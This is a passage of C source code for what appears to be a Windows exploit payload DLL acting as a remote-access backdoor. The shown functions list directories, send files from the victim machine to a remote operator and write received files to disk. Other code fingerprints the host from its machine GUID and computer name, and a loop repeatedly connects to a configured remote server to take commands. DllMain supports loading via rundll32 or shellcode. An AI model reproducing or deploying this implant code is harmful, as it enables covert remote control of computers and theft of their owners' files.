    HANDLE hFind = FindFirstFileW(lpszPath, &FindData);
    if (hFind != INVALID_HANDLE_VALUE)
    {        
        do
        {
            if (wcscmp(FindData.cFileName, L".") && wcscmp(FindData.cFileName, L".."))
            {
                WCHAR szMessage[MAX_PATH + 0x20]; 

                if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    // this is a directory                    
                    wsprintfW(szMessage, L"D %s\n", FindData.cFileName);
                }
                else
                {
                    ULARGE_INTEGER Size;
                    Size.LowPart = FindData.nFileSizeLow;
                    Size.HighPart = FindData.nFileSizeHigh;

                    // this is a file
                    wsprintfW(szMessage, L"0x%I64x %s\n", Size.QuadPart, FindData.cFileName);
                }

                if (!RemoteSendData(s, szMessage))
                {
                    dwRet = CMD_RESET;
                    break;
                }
            }
        } 
        while (FindNextFileW(hFind, &FindData));

        dwExitCode = 0;

        FindClose(hFind);
    }
    else
    {
        DbgMsg("FindFirstFile() ERROR %d\n", GetLastError());
    }    

_end:

    if (lpszPath)
    {
        M_FREE(lpszPath);
    }

    if (!RemoteSend(s, "{{{#%.8x}}}\n", dwExitCode))
    {
        dwRet = CMD_RESET;
    }

    return dwRet;
}
//--------------------------------------------------------------------------------------
DWORD CommandFileGet(SOCKET s, char *lpszArgs)
{
    DWORD dwRet = CMD_RESET;
    PWSTR lpszPath = NULL;
    PUCHAR Buff = NULL;

    if (lpszArgs == NULL)
    {
        return dwRet;
    }

    DbgMsg(__FUNCTION__"()\n");

    // allocate I/O buffer
    if ((Buff = (PUCHAR)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // get UTF-16 string length
    int PathLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
    if (PathLen == 0)
    {
        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
        goto _end;
    }

    // calculate an actual amount of needed memory
    DWORD dwPathSize = (PathLen + 1) * sizeof(WCHAR);

    // allocate memory for file path
    if ((lpszPath = (PWSTR)M_ALLOC(dwPathSize)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // convert file path from UTF-8 to UTF-16
    ZeroMemory(lpszPath, dwPathSize);
    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, PathLen);

    ULARGE_INTEGER Size;
    Size.QuadPart = -1;    

    HANDLE hFile = CreateFileW(lpszPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        if (RemoteSendData(s, (char *)&Size.QuadPart, sizeof(DWORD64)))
        {
            dwRet = CMD_OK;
        }

        goto _end;
    }

    Size.HighPart = 0;
    Size.LowPart = GetFileSize(hFile, &Size.HighPart);

    DbgMsg(__FUNCTION__"(): File size is 0x%I64x\n", Size.QuadPart);

    DWORD64 dwSize = Size.QuadPart;
        
    if (RemoteSendData(s, (char *)&dwSize, sizeof(DWORD64)))
    {                        
        DWORD64 dwSent = 0;

        while (dwSent < Size.QuadPart)
        {
            DWORD dwReaded = 0;

            if (!ReadFile(hFile, Buff, min(PAGE_SIZE, (DWORD)(Size.QuadPart - dwSent)), &dwReaded, NULL))
            {
                DbgMsg("ReadFile() ERROR %d\n", GetLastError());
                break;
            }

            if (dwReaded == 0)
            {
                break;
            }

            if (!RemoteSendData(s, (char *)Buff, dwReaded))
            {
                break;
            }

            dwSent += dwReaded;
        }

        if (dwSent == Size.QuadPart)
        {
            dwRet = CMD_OK;
        }
    }

    CloseHandle(hFile);

_end:

    if (lpszPath)
    {
        M_FREE(lpszPath);
    }

    if (Buff)
    {
        M_FREE(Buff);
    }

    return dwRet;
}
//--------------------------------------------------------------------------------------
DWORD CommandFilePut(SOCKET s, char *lpszArgs)
{
    DWORD dwRet = CMD_RESET;
    PWSTR lpszPath = NULL;
    PUCHAR Buff = NULL;

    if (lpszArgs == NULL)
    {
        return dwRet;
    }

    DbgMsg(__FUNCTION__"()\n");

    // allocate I/O buffer
    if ((Buff = (PUCHAR)M_ALLOC(PAGE_SIZE)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // get UTF-16 string length
    int PathLen = MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, NULL, 0);
    if (PathLen == 0)
    {
        DbgMsg("MultiByteToWideChar() ERROR %d\n", GetLastError());
        goto _end;
    }

    // calculate an actual amount of needed memory
    DWORD dwPathSize = (PathLen + 1) * sizeof(WCHAR);

    // allocate memory for file path
    if ((lpszPath = (PWSTR)M_ALLOC(dwPathSize)) == NULL)
    {
        DbgMsg("M_ALLOC() ERROR %d\n", GetLastError());
        goto _end;
    }

    // convert file path from UTF-8 to UTF-16
    ZeroMemory(lpszPath, dwPathSize);
    MultiByteToWideChar(CP_UTF8, 0, lpszArgs, -1, lpszPath, PathLen);

    UCHAR Status = 0;

    HANDLE hFile = CreateFileW(lpszPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        if (RemoteSendData(s, (char *)&Status, sizeof(UCHAR)))
        {
            dwRet = CMD_OK;
        }

        goto _end;
    }
    else
    {
        Status = 1;

        if (!RemoteSendData(s, (char *)&Status, sizeof(UCHAR)))
        {
            goto _end;
        }
    }
    
    DWORD64 dwSize = 0;

    if (RemoteRecvData(s, (char *)&dwSize, sizeof(DWORD64)))
    {
        DWORD64 dwReceived = 0;

        DbgMsg(__FUNCTION__"(): File size is 0x%I64x\n", dwSize);

        while (dwReceived < dwSize)
        {
            DWORD dwReaded = min(PAGE_SIZE, (DWORD)(dwSize - dwReceived)), dwWritten = 0;

            if (!RemoteRecvData(s, (char *)Buff, dwReaded))
            {
                break;
            }

            if (!WriteFile(hFile, Buff, dwReaded, &dwWritten, NULL))
            {
                DbgMsg("WriteFile() ERROR %d\n", GetLastError());
                break;
            }

            if (dwReaded != dwWritten)
            {
                break;
            }

            dwReceived += dwWritten;
        }

        if (dwReceived == dwSize)
        {
            dwRet = CMD_OK;
        }
    }

    CloseHandle(hFile);

_end:

    if (lpszPath)
    {
        M_FREE(lpszPath);
    }

    if (Buff)
    {
        M_FREE(Buff);
    }

    return dwRet;
}
//--------------------------------------------------------------------------------------
BOOL GetMachineSpecificData(char *lpszBuff, ULONG dwMaxLength)
{
    HKEY hKey;
    BOOL bRet = FALSE;
    REGSAM SamDesired = KEY_QUERY_VALUE;

    GET_IMPORT("kernel32.dll", IsWow64Process);

    if (f_IsWow64Process)
    {
        BOOL bIsWoW64 = FALSE;
        f_IsWow64Process(GetCurrentProcess(), &bIsWoW64);

        if (bIsWoW64)
        {
            SamDesired |= KEY_WOW64_64KEY;
        }
    }

    LONG Code = RegOpenKeyEx(HKEY_LOCAL_MACHINE, MACHINE_GUID_KEY, 0, SamDesired, &hKey);
    if (Code == ERROR_SUCCESS)
    {
        ULONG dwSize = dwMaxLength, dwType = 0;
        Code = RegQueryValueEx(hKey, MACHINE_GUID_VAL, NULL, &dwType, (PBYTE)lpszBuff, &dwSize);
        if (Code == ERROR_SUCCESS && dwType == REG_SZ && dwSize > 0)
        {
            bRet = TRUE;
        }
        else
        {
            DbgMsg("RegQueryValueEx() ERROR %d\n", Code);
        }

        RegCloseKey(hKey);
    }
    else
    {
        DbgMsg("RegOpenKey() ERROR %d\n", Code);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL GetIdent(char *lpszIdent, DWORD dwIdentSize)
{
    char szMachineGuid[MAX_PATH];
    
    if (dwIdentSize < MD5_SUM_SIZE_STR)
    {
        return FALSE;
    }

    // query machine GUID
    if (!GetMachineSpecificData(szMachineGuid, MAX_PATH))
    {
        return FALSE;
    }   

    WCHAR szComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    ULONG dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
    if (!GetComputerNameW(szComputerName, &dwComputerNameLen))
    {
        DbgMsg("GetComputerName() ERROR %d\n", GetLastError());
        return FALSE;
    }

    BOOL bSuccess = FALSE;    
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;    

    if (CryptMD5Init(&hProv, &hHash))
    {
        if (CryptMD5Update(hHash, (PVOID)&szMachineGuid, lstrlen(szMachineGuid)) &&
            CryptMD5Update(hHash, (PVOID)&szComputerName, dwComputerNameLen * sizeof(WCHAR)))
        {
            UCHAR Hash[MD5_SUM_SIZE];

            if (bSuccess = CryptMD5Final(hHash, Hash))
            {
                for (int i = 0; i < sizeof(Hash); i += 1)
                {
                    wsprintf(lpszIdent + i * 2, "%.2x", Hash[i]);
                }
            }
        }

        CryptMD5Close(hProv, hHash);
    }    

    return bSuccess;
}
//--------------------------------------------------------------------------------------
LONG WINAPI UnhandledException(PEXCEPTION_POINTERS ExceptionInfo)
{
    DbgMsg("******************************************************\n");

    DbgMsg(__FUNCTION__"(): %s (PID: %d)\n", m_szPath, GetCurrentProcessId());
    DbgMsg(__FUNCTION__"(): Unhandled exception 0x%.8x at address "IFMT", thread %.4X:%.4X\n",
        ExceptionInfo->ExceptionRecord->ExceptionCode,
        ExceptionInfo->ExceptionRecord->ExceptionAddress,
        GetCurrentProcessId(), GetCurrentThreadId()
    );

    DbgMsg("******************************************************\n");

    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_INVALID_HANDLE)
    {
        // ignore invalid handle exceptions
        DbgMsg(__FUNCTION__"(): Ignoring exception...\n");
        return EXCEPTION_CONTINUE_EXECUTION;
    }

#ifdef USE_DEBUG_BREAK_ON_EXCEPTION

    DebugBreak();

#endif

    ExitProcess(ExceptionInfo->ExceptionRecord->ExceptionCode);

    return EXCEPTION_CONTINUE_SEARCH;
}
//--------------------------------------------------------------------------------------
void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{    
    if (m_hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME))
    {
        if (GetLastError() == ERROR_ALREADY_EXISTS)
        {
            DbgMsg("ERROR: Already running\n");
            return;
        }
    }

    char *lpszCmd = GetCommandLine();

    SetUnhandledExceptionFilter(UnhandledException);

    DbgMsg(__FUNCTION__"(): Running as \"%s\" (PID = %d)\n", m_szPath, GetCurrentProcessId());
    DbgMsg(__FUNCTION__"(): Command line: %s\n", lpszCmd ? lpszCmd : "<NULL>");

#ifdef DBG_HELLO_MSG

    char szMsg[MAX_PATH];

    wsprintf(
        szMsg,
        "Exploit payload is started in process \"%s\" (PID = %d),\n"
        "<OK> to end it.",
        m_szPath, GetCurrentProcessId()
    );

    MessageBox(0, szMsg, "Hello, User", MB_ICONINFORMATION);

#endif

    if (lstrlen(m_PayloadConfig.szRemoteAddress) == 0 ||
        lstrlen(m_PayloadConfig.Certificate) == 0 ||
        m_PayloadConfig.RemotePort == 0)
    {
        DbgMsg(__FUNCTION__"() ERROR: Payload is not configured\n");
        return;
    }

    if (GetIdent(m_szIdent, sizeof(m_szIdent)))
    {
        DbgMsg(__FUNCTION__"(): ID = %s\n", m_szIdent);
    }

    // get OS version information 
    m_OsVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if (!GetVersionEx(&m_OsVersion))
    {
        DbgMsg("GetVersionEx() ERROR %d\n", GetLastError());
        return;
    }

    WSADATA WsaData;
    if ((WSAStartup(MAKEWORD(2, 2), &WsaData)) != 0)
    {
        DbgMsg("WSAStartup() ERROR %d\n", WSAGetLastError());
        return;
    }    

    PVOID CertData = (PVOID)&m_PayloadConfig.Certificate;
    DWORD dwCertDataLen = lstrlen(m_PayloadConfig.Certificate);

    if (!CertLoad(CertData, dwCertDataLen, &m_CertContext))
    {
        DbgMsg("ERROR: Can't load certificate\n");
        return;
    }

    ProxyInitialize();

    while (true)
    {
        DWORD Address = ResolveHostname(m_PayloadConfig.szRemoteAddress);
        if (Address != INADDR_NONE)
        {
            SOCKET s = RemoteConnect(Address, m_PayloadConfig.RemotePort);
            if (s != NULL)
            {
                m_dwStartTime = GetTickCount();
                DWORD dwRet = RemoteCommunicate(s);

                if ((dwRet & ~CMD_NO_CLOSE) == CMD_EXIT)
                {
                    DbgMsg(__FUNCTION__"(): CMD_EXIT\n");

                    if (!(dwRet & CMD_NO_CLOSE))
                    {
                        closesocket(s);
                    }
                    
                    break;
                }
                else if ((dwRet & ~CMD_NO_CLOSE) == CMD_RESET)
                {
                    DbgMsg(__FUNCTION__"(): CMD_RESET\n");

                    if (!(dwRet & CMD_NO_CLOSE))
                    {
                        closesocket(s);
                    }

                    continue;
                }

                DbgMsg(__FUNCTION__"(): Disconnected\n");

                closesocket(s);
            }
        }        

        Sleep(REMOTE_RECONNECT_SLEEP * 1000);
    }

    ProxyUninitialize();

    if (m_hMutex != NULL)
    {
        CloseHandle(m_hMutex);
    }

    DbgMsg(__FUNCTION__"(): EXIT\n");
}
//--------------------------------------------------------------------------------------
DWORD WINAPI EntryPointThread(PVOID lpParam)
{
    HMODULE hModule = (HMODULE)lpParam;

    // call the main function
    EntryPoint(NULL, hModule, NULL, SW_SHOWNORMAL);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, ULONG_PTR lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        GetModuleFileName(GetModuleHandle(NULL), m_szPath, MAX_PATH);

        if (StrStr(m_szPath, "rundll32.exe") != NULL)
        {
            // don't call main function, rundll32 will do it
            return TRUE;
        }

        if (lpReserved == NULL)
        {
            // call main function in the new thread
            HANDLE hThread = CreateThread(NULL, 0, EntryPointThread, hModule, 0, NULL);
            if (hThread)
            {
                CloseHandle(hThread);
            }
        }
        else
        {
            // image was loaded by the shellcode, call main function from the entry point
            EntryPoint(NULL, hModule, NULL, SW_SHOWNORMAL);
        }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:

        break;
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
// EoF
